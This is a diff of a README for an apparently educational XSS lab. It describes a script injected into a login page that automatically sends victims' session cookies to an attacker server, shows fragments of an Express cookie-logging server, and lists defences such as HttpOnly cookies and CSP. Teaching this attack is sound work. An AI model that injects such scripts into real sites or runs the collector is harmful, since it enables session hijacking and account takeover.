@@ -93,12 +93,12 @@ http://192.168.X.X:4000
 
 ---
 
-### 📌 **The XSS Payload (Auto Cookie Theft)**
+### 📌 The XSS Payload (Auto Cookie Theft)
 This script is injected into the vulnerable login page (index.html) so that when the victim logs in, their cookie is stolen automatically.
 
 ---
 
-### 🔹 **Inside index.html (before </body>)**
+### 🔹 Inside index.html (before </body>)
 html
 Copy
 Edit
@@ -109,12 +109,14 @@ document.getElementById("loginForm").addEventListener("submit", function() {
 </script>
 🔹 Replace 192.168.64.2 with your attacker's IP (run ip a to check).
 
-### ✅ **This ensures that every login automatically sends the session cookie to the attacker! 🎯**
+### ✅ This ensures that every login automatically sends the session cookie to the attacker! 🎯
+
+---
 
 📌 Attacker’s Server (attacker.js)
 This script captures and logs the stolen session cookies.
 
-###🔹 **Inside attacker.js**
+###🔹 Inside attacker.js
 javascript
 Copy
 Edit
@@ -138,8 +140,10 @@ app.listen(4000, '0.0.0.0', () => {
     console.log('🚀 Attacker server running on http://0.0.0.0:4000');
 });
 
-###📌 **How to Defend Against This Attack
-To prevent XSS-based session hijacking:**
+---
+
+#📌 How to Defend Against This Attack
+To prevent XSS-based session hijacking:
 
 1️⃣ Use HttpOnly cookies so JavaScript cannot access them.
 2️⃣ Enable Secure and SameSite flags to limit exposure.
@@ -147,7 +151,9 @@ To prevent XSS-based session hijacking:**
 4️⃣ Implement Content Security Policy (CSP) to block unauthorized scripts.
 5️⃣ Use Multi-Factor Authentication (MFA) to protect accounts.
 
-##📌 **Credits**
+--------------------------------------------
+
+#📌 CREDITS
 💻 Developed by: Md Tanvir Rana(AG2409), Margarita Nyman(AG2668)
 📅 Date: (2025-03-16)
 🛡️ For educational and ethical hacking purposes only.
